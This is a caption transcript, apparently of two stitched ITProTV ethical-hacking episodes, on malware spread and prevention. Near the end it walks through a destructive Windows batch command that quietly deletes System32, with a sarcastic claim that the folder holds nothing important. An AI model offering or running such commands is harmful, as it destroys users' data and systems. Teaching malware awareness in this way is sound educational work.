00:26:50.240\nAnd we have all these concerns about risk,\n\n517\n00:26:50.240 --> 00:26:53.900\nrisk management, where the risk is,\nhow do we address it.\n\n518\n00:26:53.900 --> 00:26:57.213\nAnd as we continue to push that\nboundary down to the desktop and\n\n519\n00:26:57.213 --> 00:27:01.422\nultimately move the desktop around,\nhacking in some respects gets easier but\n\n520\n00:27:01.422 --> 00:27:04.056\nit also is harder,\nat the same time, to defend.\n\n521\n00:27:04.056 --> 00:27:05.650\nAnd we have to just think about this.\n\n522\n00:27:05.650 --> 00:27:08.602\nBecause if I'm sitting in\nthe same environment as you are,\n\n523\n00:27:08.602 --> 00:27:12.020\nlooking at what you're doing,\nremotely or physically present,\n\n524\n00:27:12.020 --> 00:27:15.610\nI can gain almost any advantage I want\nregardless of the software you're using.\n\n525\n00:27:15.610 --> 00:27:18.320\nSo we have to just think about\nhow all this comes together.\n\n526\n00:27:18.320 --> 00:27:21.180\nFile sharing, traditional issue and\nconcern here.\n\n527\n00:27:21.180 --> 00:27:25.467\nNet bio space file shares are just\nputting up a file share and\n\n528\n00:27:25.467 --> 00:27:27.968\nusing peer-to-peer networks.\n\n529\n00:27:27.968 --> 00:27:29.856\nI don't know if we talked about\nthis last time I was here or not.\n\n530\n00:27:29.856 --> 00:27:31.970\nBut did you see that\nNapster 's coming back?\n\n531\n00:27:31.970 --> 00:27:34.072\nNot the original Napster,\nbut somebody got the name.\n\n532\n00:27:34.072 --> 00:27:38.772\nThey actually took the name and\nthey're relaunching the service as part of\n\n533\n00:27:38.772 --> 00:27:42.217\na cloud music streaming environment,\nessentially.\n\n534\n00:27:42.217 --> 00:27:44.364\nI don't know if it's\nthe one that Jay-Z does,\n\n535\n00:27:44.364 --> 00:27:47.190\nI think it may be his service\nthat ultimately bought it.\n\n536\n00:27:47.190 --> 00:27:50.153\nBut it's one of the big ones that has\nit and they actually bought the rights,\n\n537\n00:27:50.153 --> 00:27:52.249\ngot it out of litigation,\ngot the rights to the name.\n\n538\n00:27:52.249 --> 00:27:54.430\nThey're gonna relaunch\nthe Napster service.\n\n539\n00:27:54.430 --> 00:27:56.441\nFor those of you that have been\naround long enough doing this,\n\n540\n00:27:56.441 --> 00:27:57.844\nboy that's a blast from the past, right?\n\n541\n00:27:57.844 --> 00:27:59.240\n&gt;&gt; Wow, yeah.\n\n542\n00:27:59.240 --> 00:28:02.630\n&gt;&gt; So fake programs, untrusted sites and\nsoftware that comes from them.\n\n543\n00:28:02.630 --> 00:28:04.720\nThere's no such thing as free software.\n\n544\n00:28:04.720 --> 00:28:07.170\nIf you remember that\nconversation we've had, right,\n\n545\n00:28:07.170 --> 00:28:11.620\ndownloading anything from the Internet is\nessentially an invitation, potentially,\n\n546\n00:28:11.620 --> 00:28:14.220\nto bring malware into the organization.\n\n547\n00:28:14.220 --> 00:28:16.910\nAnd if we as, again,\nsecurity professionals,\n\n548\n00:28:16.910 --> 00:28:21.950\nas ethical hackers, are giving our\nusers admin rights to their desktops,\n\n549\n00:28:21.950 --> 00:28:25.870\nI mean this is one of the fundamental\nproblems with what we do.\n\n550\n00:28:25.870 --> 00:28:27.960\nI think I've railed\nagainst this before and\n\n551\n00:28:27.960 --> 00:28:32.090\nI've talked about this before in other\nepisodes where I basically said listen,\n\n552\n00:28:32.090 --> 00:28:36.730\nas a security professional it's our job\nto figure out how to install software and\n\n553\n00:28:36.730 --> 00:28:38.690\nmanage environments without\nthrowing up our hands and\n\n554\n00:28:38.690 --> 00:28:39.870\nsaying I don't know what to do.\n\n555\n00:28:39.870 --> 00:28:43.900\nLet me give my users admin rights and\npush the problem to them.\n\n556\n00:28:43.900 --> 00:28:46.130\nWe call that kicking\nthe can down the road.\n\n557\n00:28:46.130 --> 00:28:49.287\nThat's the polite way of saying that\nyou're not doing your job, right?\n\n558\n00:28:49.287 --> 00:28:52.862\nBecause it's your job as a security\nprofessional to figure out\n\n559\n00:28:52.862 --> 00:28:57.381\nas an admin professional, partner with\nthe IT admin team and figure out how to do\n\n560\n00:28:57.381 --> 00:29:02.797\nconfiguration management, and continuous\nmonitoring, and gap analysis to remediate.\n\n561\n00:29:02.797 --> 00:29:06.433\nDon't just throw your hands up and say, I\ncan't figure it out so I have to give you\n\n562\n00:29:06.433 --> 00:29:09.751\nrights to install anything you want,\nand then get upset at users when they\n\n563\n00:29:09.751 --> 00:29:13.254\ninstall basically just junk, right,\non the system, all sorts of malware.\n\n564\n00:29:13.254 --> 00:29:16.212\nAnd then you're the one that\nultimately has to deal with it,\n\n565\n00:29:16.212 --> 00:29:19.430\nbecause the user throws their hands up and\nsays, well, hey.\n\n566\n00:29:19.430 --> 00:29:21.665\nYou allowed me to do this,\nlike it's my fault?\n\n567\n00:29:21.665 --> 00:29:22.814\n&gt;&gt; Yeah, what did you expect?\n\n568\n00:29:22.814 --> 00:29:24.629\n&gt;&gt; Exactly, what did you expect?\n\n569\n00:29:24.629 --> 00:29:27.715\nThe stupid puppy dog look,\nlike well, I'm sorry.\n\n570\n00:29:27.715 --> 00:29:30.090\nI used to have a dog years ago\nthat would get into the garbage.\n\n571\n00:29:30.090 --> 00:29:34.081\nWhenever we would go out we'd have\nto put the garbage pails up on\n\n572\n00:29:34.081 --> 00:29:38.843\nthe counter whatever, one of these\nlittle toy, two by two little things.\n\n573\n00:29:38.843 --> 00:29:41.171\nAnd it wasn't just the dog.\n\n574\n00:29:41.171 --> 00:29:41.721\n&gt;&gt; Springs in the legs?\n\n575\n00:29:41.721 --> 00:29:46.382\n&gt;&gt; No, no, the dogs and the cats,\nright, so they were working in unison.\n\n576\n00:29:46.382 --> 00:29:46.940\n&gt;&gt; I gotcha.\n&gt;&gt; I'm\n\n577\n00:29:46.940 --> 00:29:49.890\nconvinced they're gonna take over\nthe world one day when nobody's looking.\n\n578\n00:29:49.890 --> 00:29:50.884\nRemember Pinky and the Brain?\n\n579\n00:29:50.884 --> 00:29:52.330\n&gt;&gt; Yeah, yeah.\n&gt;&gt; Kinda like that only with cats and\n\n580\n00:29:52.330 --> 00:29:57.430\ndogs, so the cat would actually\nknock the garbage off the counter.\n\n581\n00:29:57.430 --> 00:29:59.587\nAnd then the dog would would go and\ntear it all up.\n\n582\n00:29:59.587 --> 00:30:02.530\nAnd then the cat would go in and\nget whatever the cat wanted.\n\n583\n00:30:02.530 --> 00:30:03.708\nAnd then the cat was smart enough to go\n\n584\n00:30:03.708 --> 00:30:04.342\nhide-\n&gt;&gt; [LAUGH]\n\n585\n00:30:04.342 --> 00:30:05.783\n&gt;&gt; So that when you would come home,\n\n586\n00:30:05.783 --> 00:30:09.031\nthe dog was all proud, sitting in\nthe middle of the garbage in the kitchen.\n\n587\n00:30:09.031 --> 00:30:11.337\nLook at what I did and\nthe cat is the evil genius.\n\n588\n00:30:11.337 --> 00:30:12.374\n&gt;&gt; [LAUGH]\n&gt;&gt; Behind\n\n589\n00:30:12.374 --> 00:30:14.287\nthe scenes pulling the stings, right?\n\n590\n00:30:14.287 --> 00:30:17.670\nSo it's the same concept.\n\n591\n00:30:17.670 --> 00:30:19.940\nThe users don't know any better, right?\n\n592\n00:30:19.940 --> 00:30:22.648\nI mean,\nusers only know what you allow them to do.\n\n593\n00:30:22.648 --> 00:30:26.690\nAnd as an ethical hacker, you're also a\nsecurity professional, first and foremost.\n\n594\n00:30:26.690 --> 00:30:30.450\nAnd as I've often talked about,\nyou've gotta think about\n\n595\n00:30:30.450 --> 00:30:34.070\nwhat is acceptable in your world,\nand you've gotta manage accordingly.\n\n596\n00:30:34.070 --> 00:30:35.340\nAnd you've just gotta\nthink about whether or\n\n597\n00:30:35.340 --> 00:30:37.340\nnot you wanna allow users\nto do this stuff, right?\n\n598\n00:30:37.340 --> 00:30:39.250\nHow do we distribute malware over the web?\n\n599\n00:30:39.250 --> 00:30:42.110\nMost websites that you would\ngo to may have a malware\n\n600\n00:30:42.110 --> 00:30:44.380\ncomponent running on them\nthat you may not be aware of.\n\n601\n00:30:44.380 --> 00:30:47.171\nThere are things like iFrame attacks or\ncross-site scripting attacks,\n\n602\n00:30:47.171 --> 00:30:49.962\ncross-site request forgery attacks,\nwe'll talk about some of those,\n\n603\n00:30:49.962 --> 00:30:51.327\nwe've talked about them already.\n\n604\n00:30:51.327 --> 00:30:54.400\nWe'll talk about them again\nin upcoming conversations.\n\n605\n00:30:54.400 --> 00:30:59.620\nThere's all sorts of stuff out there that\nusers come across on a regular basis,\n\n606\n00:30:59.620 --> 00:31:01.220\nwithout even realizing it.\n\n607\n00:31:01.220 --> 00:31:04.910\nAnd because they're running anti-malware,\nbecause they're running anti-virus\n\n608\n00:31:04.910 --> 00:31:07.820\nsoftware on their systems,\na lot of time it hits that screen and\n\n609\n00:31:07.820 --> 00:31:10.260\ngets knocked down before\nit can infect the system.\n\n610\n00:31:10.260 --> 00:31:13.960\nBut if users allow pop-ups and\ndo all this kind of stuff and\n\n611\n00:31:13.960 --> 00:31:18.130\nlower their security settings, right,\nthis is when we get into trouble.\n\n612\n00:31:18.130 --> 00:31:23.090\nDo you have the ability to go into\nthe advanced security settings on Chrome?\n\n613\n00:31:23.090 --> 00:31:23.875\nYou can do that on yours, right?\n\n614\n00:31:23.875 --> 00:31:24.729\n&gt;&gt; Let's see, I believe so.\n\n615\n00:31:24.729 --> 00:31:25.810\n&gt;&gt; All right, we'll give you a second.\n\n616\n00:31:25.810 --> 00:31:29.760\nJust I wanna show the users out there\nsome of the things that we can get into\n\n617\n00:31:29.760 --> 00:31:30.450\ntrouble by doing.\n\n618\n00:31:30.450 --> 00:31:34.140\nI know you don't have IE\nrunning on your box, right?\n\n619\n00:31:34.140 --> 00:31:36.650\nBut if you think about all\nthe web browsers out there,\n\n620\n00:31:36.650 --> 00:31:39.760\nwhether it's IE, whether it's Edge,\nwhether it's Chrome,\n\n621\n00:31:39.760 --> 00:31:41.840\nwhether it's Firefox,\nSafari, doesn't matter.\n\n622\n00:31:41.840 --> 00:31:43.580\nAll of them have advanced settings.\n\n623\n00:31:43.580 --> 00:31:45.484\nWhen you go in, and\nyou can go to the Settings and\n\n624\n00:31:45.484 --> 00:31:47.775\nthen usually at the bottom\nthere's Advanced Settings.\n\n625\n00:31:47.775 --> 00:31:49.152\nYou already clicked on that, right?\n\n626\n00:31:49.152 --> 00:31:52.145\nAnd then there's all the different\nstuff you can get into in there.\n\n627\n00:31:52.145 --> 00:31:55.929\nAnd you can lower and raise various\nsecurity areas, right, to lower and\n\n628\n00:31:55.929 --> 00:31:56.807\nhigher levels.\n\n629\n00:31:56.807 --> 00:31:58.889\nChrome does it slightly differently.\n\n630\n00:31:58.889 --> 00:32:03.687\nIn IE we have the trusted sites, and\nthe Internet zone, the different zones and\n\n631\n00:32:03.687 --> 00:32:07.483\nYou go in and check off and\nuncheck the things you want, and IE,\n\n632\n00:32:07.483 --> 00:32:10.775\nat least they go in and\nthey tell you next to the settings\n\n633\n00:32:10.775 --> 00:32:16.085\nthat are really potentially problematic,\nhey this is unsecure if you enable it.\n\n634\n00:32:16.085 --> 00:32:17.740\n&gt;&gt; Mm-hm.\n&gt;&gt; They highlight it in red, and\n\n635\n00:32:17.740 --> 00:32:21.220\nthey flash and do all this stuff\nto try to tell you what not to do.\n\n636\n00:32:21.220 --> 00:32:23.670\nBut the reality is users,\nif we give them rights,\n\n637\n00:32:23.670 --> 00:32:27.900\nwill do this stuff all the time, and\nI'm constantly having this conversation\n\n638\n00:32:27.900 --> 00:32:30.720\nwith all sorts of people [LAUGH] right,\nwhy do we get infected?\n\n639\n00:32:30.720 --> 00:32:33.120\nWell, what are your settings,\nI mean that's really what it is, so\n\n640\n00:32:33.120 --> 00:32:37.630\nwhen you allow users access to this kind\nof stuff, this is what can go wrong and\n\n641\n00:32:37.630 --> 00:32:38.280\nwhat can happen.\n\n642\n00:32:38.280 --> 00:32:40.290\nSo what do you have up there,\nare those the?\n\n643\n00:32:40.290 --> 00:32:42.390\n&gt;&gt; You want to remember my passwords for\nme.\n\n644\n00:32:42.390 --> 00:32:46.230\n&gt;&gt; Okay, you got remember your passwords,\nsure, so we got that, that's always a good\n\n645\n00:32:46.230 --> 00:32:49.822\none, can just dump that file out\nwith all your cookies, right?\n\n646\n00:32:49.822 --> 00:32:53.938\n&gt;&gt; Mm-hm, not a lot of-\n&gt;&gt; Google doesn't expose a lot of the way\n\n647\n00:32:53.938 --> 00:32:57.513\nIE does, but you get the general idea\nright, I mean you know what I'm talking\n\n648\n00:32:57.513 --> 00:33:01.160\nabout probably, and a lot of you that\nare using various browsers will have it.\n\n649\n00:33:01.160 --> 00:33:05.960\nFirefox has it in there as well as does\nSafari, right, we've got spear fishing\n\n650\n00:33:05.960 --> 00:33:10.849\nsites out there, you got malware\nadvertisement, called malvertising sites.\n\n651\n00:33:10.849 --> 00:33:13.855\nDrive-by downloads are real popular\nwhere you hit a website and\n\n652\n00:33:13.855 --> 00:33:17.030\nall of the sudden something pops up and\nstarts installing.\n\n653\n00:33:17.030 --> 00:33:19.950\nThis is all the kind of stuff that\ncan really be an issue for us, and\n\n654\n00:33:19.950 --> 00:33:23.040\nwe have to just think about what\nthe concerns are out there.\n\n655\n00:33:23.040 --> 00:33:28.370\nAs we overview the vocabulary, overview\nthe concepts, think about those issues and\n\n656\n00:33:28.370 --> 00:33:32.840\nconcerns, we have to really be focused\non what are we gonna do to prevent this.\n\n657\n00:33:32.840 --> 00:33:36.970\nThe number one thing that we can be\ndoing is having a good antivirus,\n\n658\n00:33:36.970 --> 00:33:40.730\nantimalware software solution running and\nnot just one.\n\n659\n00:33:40.730 --> 00:33:44.202\nWe often talk about having more\nthan one protective enclave, or\n\n660\n00:33:44.202 --> 00:33:48.125\nprotective perimeter that runs in our\nsystems through these defense and\n\n661\n00:33:48.125 --> 00:33:50.393\ndepth layers or rings that we talk about.\n\n662\n00:33:50.393 --> 00:33:53.568\nAnd customers and students ask all\nthe time, hey what do you use and\n\n663\n00:33:53.568 --> 00:33:55.845\ndo you run more than one\nprogram on your system?\n\n664\n00:33:55.845 --> 00:33:59.571\nAnd I run two or three different\nthings on my system at all times,\n\n665\n00:33:59.571 --> 00:34:04.230\nbecause I know that any one program is\nonly as good as the software definitions.\n\n666\n00:34:04.230 --> 00:34:08.290\nThe updates that we get, and all vendors\nare out there updating, but they update at\n\n667\n00:34:08.290 --> 00:34:11.540\ndifferent cycles for different reasons,\nwith different specificity.\n\n668\n00:34:11.540 --> 00:34:15.830\nAnd if I don't run more than one program,\nchances are good I'm not gonna have\n\n669\n00:34:15.830 --> 00:34:19.360\nall that information updated, and\nI may miss something that one picks up and\n\n670\n00:34:19.360 --> 00:34:22.660\nanother does not, right, so\nit's very important to think about that.\n\n671\n00:34:22.660 --> 00:34:26.051\n&gt;&gt; Alright Adam, great first look at\nmalware threats, we got a lot of good\n\n672\n00:34:26.051 --> 00:34:29.233\nterminology there, broke down\nsome of those basic definitions.\n\n673\n00:34:29.233 --> 00:34:31.755\nSo we'd have an idea of what\nwe're talking about, so\n\n674\n00:34:31.755 --> 00:34:34.850\nwe can make that conversation meaningful,\nso good look at that.\n\n675\n00:34:34.850 --> 00:34:37.810\nWe've got more to come but\nunfortunately we're out of time for\n\n676\n00:34:37.810 --> 00:34:42.510\nthis particular episode, so signing\noff for ITProTV, I'm Mike Roderick.\n\n677\n00:34:42.510 --> 00:34:43.451\n&gt;&gt; I'm Adam Gordon.\n\n678\n00:34:43.451 --> 00:34:45.722\n&gt;&gt; And we'll see you next time.\n\n679\n00:34:45.722 --> 00:34:54.110\n[MUSIC]\n\n",

00:00:17.270\nI'm your host Mike Rodrick, and\n\n4\n00:00:17.270 --> 00:00:20.210\ntoday we're doing out\nCertified Ethical Hacker version 9.\n\n5\n00:00:20.210 --> 00:00:22.010\nAnd specifically this one,\n\n6\n00:00:22.010 --> 00:00:26.118\nwe're gonna continue on our\nthe conversation on malware threats.\n\n7\n00:00:26.118 --> 00:00:28.370\nWe've taken a look at\nsome basic term analogy,\n\n8\n00:00:28.370 --> 00:00:31.610\nwe've talked about ways that\nmalware can be spread or\n\n9\n00:00:31.610 --> 00:00:35.350\nyour system can get infected and\nwe've got more to talk about.\n\n10\n00:00:35.350 --> 00:00:37.299\nAnd here of course is Mr. Adam Gordon.\n\n11\n00:00:37.299 --> 00:00:38.308\nHow are you doing Adam?\n\n12\n00:00:38.308 --> 00:00:43.229\n&gt;&gt; I'm good, I'm good, I'm feeling\na little down, much like I have a virus.\n\n13\n00:00:43.229 --> 00:00:44.970\n&gt;&gt; No.\n[LAUGH]\n\n14\n00:00:44.970 --> 00:00:46.490\n&gt;&gt; See if we can inoculate me and\n\n15\n00:00:46.490 --> 00:00:48.390\nkeep going and finish strong.\n\n16\n00:00:48.390 --> 00:00:49.420\n&gt;&gt; We'll run a scan on you.\n\n17\n00:00:49.420 --> 00:00:50.360\n&gt;&gt; Okay you could do that.\n\n18\n00:00:50.360 --> 00:00:52.480\nSo speaking of running scans\nactually all kidding aside.\n\n19\n00:00:52.480 --> 00:00:54.130\nIt's great when we set these\nthings up ahead of time and\n\n20\n00:00:54.130 --> 00:00:59.510\nwe don't do them live with no planning\ncuz hey, how would that turn out right?\n\n21\n00:00:59.510 --> 00:01:03.860\nAll right, so speaking of doing a scan,\nwhat we thought we'd start out with and\n\n22\n00:01:03.860 --> 00:01:04.770\nobviously, as Mike said,\n\n23\n00:01:04.770 --> 00:01:08.210\ncontinue our conversation here but\nthere's a lot of places online.\n\n24\n00:01:08.210 --> 00:01:14.310\nWe talk about the impact of the cloud and\nthe ability to use the cloud today and\n\n25\n00:01:14.310 --> 00:01:19.240\nthe Internet in all sorts of innovative\nways, both for good and for evil, right?\n\n26\n00:01:19.240 --> 00:01:23.150\nWe were just talking before we came back\non, between the break and the two episodes\n\n27\n00:01:23.150 --> 00:01:26.830\nwe're doing now, about the fact that in\nthe good old days, as you were saying.\n\n28\n00:01:26.830 --> 00:01:31.080\nGone are the days where you could go\nout on the Internet and safely surf\n\n29\n00:01:31.080 --> 00:01:34.080\nwithout actually worrying about things\nunless you click on something or\n\n30\n00:01:34.080 --> 00:01:36.890\ndid something or whatever,\nas we've been talking about.\n\n31\n00:01:36.890 --> 00:01:42.300\nToday, really, it's the age of\nsimply open the browser and\n\n32\n00:01:42.300 --> 00:01:46.330\nyou're assaulted literally almost from\nthe time you connect by a whole host of\n\n33\n00:01:46.330 --> 00:01:50.610\nvariety of different attack vectors,\nand things that are out to get you.\n\n34\n00:01:50.610 --> 00:01:54.300\nYou may just really be out looking for\nsomething totally innocent, and\n\n35\n00:01:54.300 --> 00:01:56.098\nwe're gonna come try to find you.\n\n36\n00:01:56.098 --> 00:01:58.320\nSo yeah,\nit's a very different world today.\n\n37\n00:01:58.320 --> 00:02:02.625\nAnd the cloud has played a great role\nin being able to spread knowledge and\n\n38\n00:02:02.625 --> 00:02:05.635\nbeing able to implement all\nsorts of scalability and\n\n39\n00:02:05.635 --> 00:02:09.545\ncapabilities that we use today\nto drive a variety of things.\n\n40\n00:02:09.545 --> 00:02:13.865\nBut like anything else, it's also been\nco-oped by the forces of evil, right?\n\n41\n00:02:13.865 --> 00:02:18.155\nAnd the bad actors are out there orbiting\nin the Cloud looking to do us harm.\n\n42\n00:02:18.155 --> 00:02:20.820\nSo one of the things is ethical\nhackers want to be aware of\n\n43\n00:02:20.820 --> 00:02:22.790\nis the fact that there\nare resources out there.\n\n44\n00:02:22.790 --> 00:02:24.590\nWe've touched on many of\nthem on prior episodes.\n\n45\n00:02:24.590 --> 00:02:27.943\nWe'll continue to as we go\nforward in various thematic ways,\n\n46\n00:02:27.943 --> 00:02:31.240\ntalking about places and\nareas you can go to for assistance.\n\n47\n00:02:31.240 --> 00:02:34.202\nAnd for the ability to be\nable to operate securely and\n\n48\n00:02:34.202 --> 00:02:38.595\ncreate offensive capabilities that\nwill help to defend your networks.\n\n49\n00:02:38.595 --> 00:02:41.285\nBut one of the things you need to be\naware of is that fact that if you\n\n50\n00:02:41.285 --> 00:02:45.965\ncome across a piece of software that may\nfall into the category of malware and\n\n51\n00:02:45.965 --> 00:02:47.435\nyou're not quite clear on what it is.\n\n52\n00:02:47.435 --> 00:02:51.145\nAnd you've had some sorta incident\nresponse, something's gone on and now\n\n53\n00:02:51.145 --> 00:02:54.850\nyou're faced with trying to forensically\nexamine something and figure it out.\n\n54\n00:02:54.850 --> 00:02:58.065\nYou wanna be aware of the fact that\nthere are sites where you can go and\n\n55\n00:02:58.065 --> 00:02:59.203\nsubmit this sample to.\n\n56\n00:02:59.203 --> 00:03:02.237\nAnd Mike has been kind enough to\nset one up on his machine for us,\n\n57\n00:03:02.237 --> 00:03:03.567\na site called VirusTotal.\n\n58\n00:03:03.567 --> 00:03:05.733\nWe're gonna take a look\nat this right here and\n\n59\n00:03:05.733 --> 00:03:07.788\nthis is one of many sites\nthat you can go to.\n\n60\n00:03:07.788 --> 00:03:10.480\nIt's freely available,\nit's publicly available.\n\n61\n00:03:10.480 --> 00:03:14.750\nAnd if you go out and there is an upload\nfeature there right on the main page.\n\n62\n00:03:14.750 --> 00:03:18.246\nYou can upload a file and then\nthe system will go ahead and scan it and\n\n63\n00:03:18.246 --> 00:03:21.196\nreport back to you and\ntell you what's going on with it.\n\n64\n00:03:21.196 --> 00:03:25.462\nAnd it gets submitted obviously\ninto a database, virus vendors.\n\n65\n00:03:25.462 --> 00:03:28.100\nThe anti-virus software\nvendors are usually behind\n\n66\n00:03:28.100 --> 00:03:31.321\na lot of this sites because this is\nhow they will get submissions so\n\n67\n00:03:31.321 --> 00:03:33.735\nthey can figure out what's\ngoing on in the wild.\n\n68\n00:03:33.735 --> 00:03:34.610\nSo that's a good thing.\n\n69\n00:03:34.610 --> 00:03:35.970\nThere's nothing wrong with that.\n\n70\n00:03:35.970 --> 00:03:40.000\nHelping them out helps us out,\nultimately, and so that's a good thing.\n\n71\n00:03:40.000 --> 00:03:42.430\nAnd so we just wanna think about that and\nbe aware of that.\n\n72\n00:03:42.430 --> 00:03:45.590\nAnd also, if you're a little\nbit more adept at this stuff,\n\n73\n00:03:45.590 --> 00:03:49.750\nif you know how to write code, if you\nunderstand what's going on with this and\n\n74\n00:03:49.750 --> 00:03:53.100\nyou're able to examine it on your own,\nwe're gonna show you in a couple minutes\n\n75\n00:03:53.100 --> 00:03:55.700\nhow to do that in a live\nenvironment in our lab.\n\n76\n00:03:55.700 --> 00:03:59.200\nWe're gonna go in and we're gonna take\na look at being able to go in and\n\n77\n00:03:59.200 --> 00:04:03.630\nuse a virus assessment program,\na disassembler to take a look at code and\n\n78\n00:04:03.630 --> 00:04:05.210\ntalk about what goes on in there.\n\n79\n00:04:05.210 --> 00:04:09.317\nBut there are also a lot of bug bounty\nprograms that have been brought\n\n80\n00:04:09.317 --> 00:04:13.568\nout by a lot of the vendors and they\nare offering cash for you to submit if\n\n81\n00:04:13.568 --> 00:04:18.422\nyou find either viruses or things like\nthat and you wanna be able to submit them.\n\n82\n00:04:18.422 --> 00:04:22.089\nOr if you find bugs in the code and\nyou send them to the appropriate vendor,\n\n83\n00:04:22.089 --> 00:04:24.870\nthey're actually paying a reward now for\nthis stuff and\n\n84\n00:04:24.870 --> 00:04:26.370\nmost of the major vendors do.\n\n85\n00:04:26.370 --> 00:04:29.300\nMicrosoft has a program,\nVMWare does, Cisco does,\n\n86\n00:04:29.300 --> 00:04:33.490\nall the biggies do because they're looking\nfor essentially crowdsourcing right?\n\n87\n00:04:33.490 --> 00:04:37.778\nThey want the people that have eyes on\nthe platform as security professionals,\n\n88\n00:04:37.778 --> 00:04:41.109\nas users to be able to help them\nto figure out what may be wrong.\n\n89\n00:04:41.109 --> 00:04:43.414\nBecause honestly,\nno matter how good you are,\n\n90\n00:04:43.414 --> 00:04:46.820\nno matter how much code review you may do,\nyou may miss something.\n\n91\n00:04:46.820 --> 00:04:51.000\nI mean the code is so complex today that\nthere's so much stuff going on that it's\n\n92\n00:04:51.000 --> 00:04:54.090\nreally difficult to understand all\nthe implications of the choices we make.\n\n93\n00:04:54.090 --> 00:04:55.310\nSo keep this in mind.\n\n94\n00:04:55.310 --> 00:04:58.230\nSo, VirusTotal, a website that\nwould actually be kind of cool.\n\n95\n00:04:58.230 --> 00:05:02.470\nWe also thought it would be interesting\nto show you some very basic,\n\n96\n00:05:02.470 --> 00:05:04.530\nnothing too advanced, nothing crazy.\n\n97\n00:05:04.530 --> 00:05:07.660\nDon't want you going out and\nsetting the world on fire.\n\n98\n00:05:07.660 --> 00:05:10.030\nBut we thought we would show you\njust some very basic exploit code.\n\n99\n00:05:10.030 --> 00:05:13.820\nShow you a couple of tips and tricks here\nabout how to write some basic malware.\n\n100\n00:05:13.820 --> 00:05:15.870\nMike's, again, been kind enough to\nvolunteer cuz I told him there's\n\n101\n00:05:15.870 --> 00:05:18.920\nno way I'm putting this stuff on my\nmachine, but I would give him the code and\n\n102\n00:05:18.920 --> 00:05:20.099\nlet him play with it on his machine.\n\n103\n00:05:20.099 --> 00:05:24.173\n&gt;&gt; Thank you very much. [LAUGH] &gt;&gt;\n[LAUGH] So he's gonna show it to you.\n\n104\n00:05:24.173 --> 00:05:26.220\nMake sure you have your crash\nhelmet on and strap in.\n\n105\n00:05:26.220 --> 00:05:27.870\nHe's gonna show it to you on his machine.\n\n106\n00:05:27.870 --> 00:05:30.980\nOne of the reasons, all kidding aside,\nso being serious here for\n\n107\n00:05:30.980 --> 00:05:33.850\na minute, one of the reasons\nwe're doing it this way,\n\n108\n00:05:33.850 --> 00:05:37.000\nall this exploite code is code\nthat will run on a Windows system.\n\n109\n00:05:37.000 --> 00:05:40.120\nNow most of it as you could see is\nfairly straightforward and basic.\n\n110\n00:05:40.120 --> 00:05:42.730\nThere are a couple of things that can\nget you in a lot of trouble here.\n\n111\n00:05:42.730 --> 00:05:45.690\nI showed you how to delete a bunch\nof reg keys and blow the system up,\n\n112\n00:05:45.690 --> 00:05:46.920\nthat kind of thing.\n\n113\n00:05:46.920 --> 00:05:49.676\nPlease understand the following, we\nshould have put a big disclaimer up top.\n\n114\n00:05:49.676 --> 00:05:54.460\n&gt;&gt; Number 1, like all of the reality TV\nshows you see on TV with a big disclaimer,\n\n115\n00:05:54.460 --> 00:05:55.380\nright?\n\n116\n00:05:55.380 --> 00:05:58.710\nStunt professionals do\nnot try at home right?\n\n117\n00:05:58.710 --> 00:06:01.370\nThis code can get you in trouble.\n\n118\n00:06:01.370 --> 00:06:04.940\nIt can hurt your system or\nother systems that you try this on.\n\n119\n00:06:04.940 --> 00:06:07.560\nThe reason all kidding\naside as I was saying\n\n120\n00:06:07.560 --> 00:06:12.390\nthat Mike is doing this on his machine\nis he's not running a Windows machine.\n\n121\n00:06:12.390 --> 00:06:16.547\nAnd so this code will not affect this\nmachine if it were inadvertently to\n\n122\n00:06:16.547 --> 00:06:20.357\nbe exploited and or yes, or\nyou could say do not try this at home but\n\n123\n00:06:20.357 --> 00:06:22.252\ntry it your friend's machine.\n\n124\n00:06:22.252 --> 00:06:24.150\nWhich is perfectly acceptable.\n\n125\n00:06:24.150 --> 00:06:26.820\nBut we don't want this code,\nif it got out in the wild.\n\n126\n00:06:26.820 --> 00:06:30.860\nOr if Mike inadvertently by accident\nwas to execute this code while he\n\n127\n00:06:30.860 --> 00:06:31.600\nwas copying and\n\n128\n00:06:31.600 --> 00:06:35.720\nmoving it around as we were setting up, it\nwould not effect his machine the same way.\n\n129\n00:06:35.720 --> 00:06:39.330\nSo you've gotta exercise common sense and\ncaution is all I'm suggesting to you.\n\n130\n00:06:39.330 --> 00:06:41.680\nIf you want to try this code,\nthe code is there.\n\n131\n00:06:41.680 --> 00:06:43.130\nYou obviously can play with it.\n\n132\n00:06:43.130 --> 00:06:45.890\nPut it into a VM, blow the VM up,\nit's real fun and\n\n133\n00:06:45.890 --> 00:06:48.880\nexciting and\nthen get rid of the code, right?\n\n134\n00:06:48.880 --> 00:06:52.260\nThis is just meant to show you,\nto illustrate for\n\n135\n00:06:52.260 --> 00:06:55.840\nyou examples of the kind of\nthings that malware may do.\n\n136\n00:06:55.840 --> 00:06:58.760\nThis is not a course on how\ndo I write exploit code.\n\n137\n00:06:58.760 --> 00:07:01.860\nThis is not a course on how do\nI blow up my friend's machine.\n\n138\n00:07:01.860 --> 00:07:06.050\nI teach those kinds of skills to people\nbut in this forum and not in this way.\n\n139\n00:07:06.050 --> 00:07:07.900\nSo just keep that in mind.\n\n140\n00:07:07.900 --> 00:07:10.470\nSo the first one there create a powerful\n\n141\n00:07:10.470 --> 00:07:14.930\nwith notepad,we can essentially\ndelete somebody's data by doing that.\n\n142\n00:07:14.930 --> 00:07:18.700\nSo you can see that we're just kinda\nwalk through the logic, open notepad,\n\n143\n00:07:18.700 --> 00:07:21.020\ncopy the following down there,\ndel c:\\WINDOWS.\n\n144\n00:07:21.020 --> 00:07:23.470\nYou could start to imagine\nwhat that's gonna do, right?\n\n145\n00:07:23.470 --> 00:07:27.280\nSystem32 and\nthen you've got /q there for quiet so\n\n146\n00:07:27.280 --> 00:07:31.360\nit deletes without telling you, hey,\nI'm about to die, don't do that, wow.\n\n147\n00:07:31.360 --> 00:07:33.140\nRemember that scene in the Wizard of Oz?\n\n148\n00:07:33.140 --> 00:07:37.757\nMelting, melting, what a cruel world\nwhen Dorothy liquefies the witch.\n\n149\n00:07:37.757 --> 00:07:39.380\n&gt;&gt; Is there anything\nimportant in that folder?\n\n150\n00:07:39.380 --> 00:07:44.160\n&gt;&gt; No, absolutely nothing in there, we can\ndelete that without trouble, that's easy.\n\n151\n00:07:44.160 --> 00:07:47.334\nIt's the temp file that you really wanna\nbe careful with that's the one you gotta\n\n152\n00:07:47.334 --> 00:07:48.511\nmake sure you don't delete.\n\n153\n00:07:48.511 --> 00:07:51.364\nAll 